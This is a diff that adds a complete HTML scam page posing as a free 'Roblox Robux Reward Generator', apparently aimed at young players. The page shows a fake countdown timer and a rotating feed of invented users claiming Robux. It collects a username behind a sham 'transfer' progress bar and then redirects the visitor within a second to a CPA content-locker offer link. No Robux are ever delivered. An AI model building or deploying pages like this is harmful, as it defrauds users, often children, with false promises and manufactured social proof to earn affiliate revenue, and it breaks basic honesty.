@@ -1,1 +1,366 @@
+<!DOCTYPE html>
+<html lang="en" id="htmlTag">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Robux Reward Generator</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
 
+        body {
+            background-color: #0b0e11;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 15px 80px 15px;
+        }
+
+        .timer-bar {
+            background: linear-gradient(90deg, #d97706, #b45309);
+            color: #fff;
+            width: 100%;
+            max-width: 500px;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 0.85rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(217, 119, 6, 0.3);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        header h1 {
+            font-size: 1.8rem;
+            color: #00a2ff;
+            margin-bottom: 6px;
+            text-shadow: 0 0 10px rgba(0, 162, 255, 0.4);
+        }
+
+        header p {
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+
+        .cards-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .card-horizontal {
+            background: #161b22;
+            border: 2px solid #21262d;
+            border-radius: 12px;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .card-horizontal:hover {
+            transform: translateY(-2px);
+            border-color: #f59e0b;
+            background: #1c2129;
+            box-shadow: 0 5px 15px rgba(245, 158, 11, 0.2);
+        }
+
+        .card-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .card-left img {
+            width: 48px;
+            height: 48px;
+            object-fit: contain;
+        }
+
+        .card-left .amount {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        .btn-claim {
+            background: linear-gradient(180deg, #00a2ff 0%, #0077ff 100%);
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 0.9rem;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 162, 255, 0.3);
+            white-space: nowrap;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(5px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            z-index: 1000;
+        }
+
+        .modal {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 16px;
+            padding: 25px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+        }
+
+        .modal img {
+            width: 55px;
+            height: 55px;
+            margin-bottom: 10px;
+        }
+
+        .modal input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+            background: #0d1117;
+            color: #fff;
+            font-size: 1rem;
+            text-align: center;
+            margin: 15px 0;
+            outline: none;
+        }
+
+        .modal input:focus {
+            border-color: #00a2ff;
+        }
+
+        .btn-submit {
+            background: linear-gradient(180deg, #10b981 0%, #059669 100%);
+            color: #fff;
+            font-weight: bold;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 1.05rem;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+
+        .loader-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: #21262d;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #f59e0b, #10b981);
+            transition: width 0.3s linear;
+        }
+
+        .status-text {
+            font-size: 0.85rem;
+            color: #94a3b8;
+        }
+
+        .activity-feed {
+            position: fixed;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(22, 27, 34, 0.95);
+            border: 1px solid #30363d;
+            padding: 10px 18px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            z-index: 500;
+            white-space: nowrap;
+        }
+
+        .green-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #10b981;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="timer-bar" id="timerBar">
+        ⏰ Limited Time Offer: Event ends in <span id="timer">04:59</span>
+    </div>
+
+    <header>
+        <h1 id="txtTitle">Roblox Robux Reward</h1>
+        <p id="txtSub">Select your desired amount to start the transfer</p>
+    </header>
+
+    <div class="cards-list">
+        <div class="card-horizontal" onclick="openModal('400')">
+            <div class="card-left">
+                <img src="https://i.ibb.co/Kp60krxt/robux-v2.jpg" alt="Robux">
+                <div class="amount">400 Robux</div>
+            </div>
+            <button class="btn-claim txtBtn">Claim Now</button>
+        </div>
+
+        <div class="card-horizontal" onclick="openModal('800')">
+            <div class="card-left">
+                <img src="https://i.ibb.co/Kp60krxt/robux-v2.jpg" alt="Robux">
+                <div class="amount">800 Robux</div>
+            </div>
+            <button class="btn-claim txtBtn">Claim Now</button>
+        </div>
+
+        <div class="card-horizontal" onclick="openModal('1,700')">
+            <div class="card-left">
+                <img src="https://i.ibb.co/Kp60krxt/robux-v2.jpg" alt="Robux">
+                <div class="amount">1,700 Robux</div>
+            </div>
+            <button class="btn-claim txtBtn">Claim Now</button>
+        </div>
+
+        <div class="card-horizontal" onclick="openModal('4,500')">
+            <div class="card-left">
+                <img src="https://i.ibb.co/Kp60krxt/robux-v2.jpg" alt="Robux">
+                <div class="amount">4,500 Robux</div>
+            </div>
+            <button class="btn-claim txtBtn">Claim Now</button>
+        </div>
+
+        <div class="card-horizontal" onclick="openModal('10,000')">
+            <div class="card-left">
+                <img src="https://i.ibb.co/Kp60krxt/robux-v2.jpg" alt="Robux">
+                <div class="amount">10,000 Robux</div>
+            </div>
+            <button class="btn-claim txtBtn">Claim Now</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="usernameModal">
+        <div class="modal">
+            <img src="https://i.ibb.co/Kp60krxt/robux-v2.jpg" alt="Robux Logo">
+            
+            <div id="modalStep1">
+                <h3><span id="txtClaim">Claim</span> <span id="selectedAmount" style="color: #f59e0b;"></span> Robux</h3>
+                <p id="txtInputDesc" style="font-size: 0.85rem; color: #94a3b8;">Enter your Roblox Username to deliver items:</p>
+                <input type="text" id="robloxUsername" placeholder="Username (e.g. Gamer123)" required>
+                <button class="btn-submit" id="txtSubmit" onclick="startVerification()">Continue ➔</button>
+            </div>
+
+            <div id="modalStep2" class="loader-container">
+                <h3 id="loaderTitle">Connecting...</h3>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="status-text" id="statusText">Preparing transfer...</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="activity-feed">
+        <div class="green-dot"></div>
+        <span id="liveNotification">User **Alex_99** just claimed 800 Robux</span>
+    </div>
+
+    <script>
+        // رابط الـ Content Locker الخاص بك
+        const CPA_OFFER_URL = "https://game-nest.top/cl/i/4or35j";
+        const isArabic = false;
+
+        let timeLeft = 299;
+        setInterval(() => {
+            if (timeLeft <= 0) return;
+            timeLeft--;
+            let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+            let s = (timeLeft % 60).toString().padStart(2, '0');
+            document.getElementById('timer').innerText = `${m}:${s}`;
+        }, 1000);
+
+        let selectedRobux = "";
+
+        function openModal(amount) {
+            selectedRobux = amount;
+            document.getElementById('selectedAmount').innerText = amount;
+            document.getElementById('usernameModal').style.display = 'flex';
+            document.getElementById('modalStep1').style.display = 'block';
+            document.getElementById('modalStep2').style.display = 'none';
+        }
+
+        function startVerification() {
+            const username = document.getElementById('robloxUsername').value.trim();
+            if (username === "") {
+                alert("Please enter your username first!");
+                return;
+            }
+
+            document.getElementById('modalStep1').style.display = 'none';
+            document.getElementById('modalStep2').style.display = 'flex';
+
+            const fill = document.getElementById('progressFill');
+
+            // ملء الشريط بسرعة خاطفة (0.4 ثانية)
+            setTimeout(() => {
+                fill.style.width = "100%";
+            }, 100);
+
+            // توجيه فوري خلال 0.8 ثانية مباشرة لرابط العروض
+            setTimeout(() => {
+                window.location.href = CPA_OFFER_URL;
+            }, 800);
+        }
+
+        const fakeUsers = ["GamerPro99", "Shadow_Rbx", "Liam2026", "NoobSlayer", "Maya_Blox", "King_Roblox", "Sofia_Gamer"];
+        const fakeAmounts = ["400", "800", "1,700", "4,500"];
+        
+        setInterval(() => {
+            const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+            const amt = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
+            document.getElementById('liveNotification').innerText = `User ${user} just claimed ${amt} Robux`;
+        }, 4000);
+    </script>
+</body>
+</html>
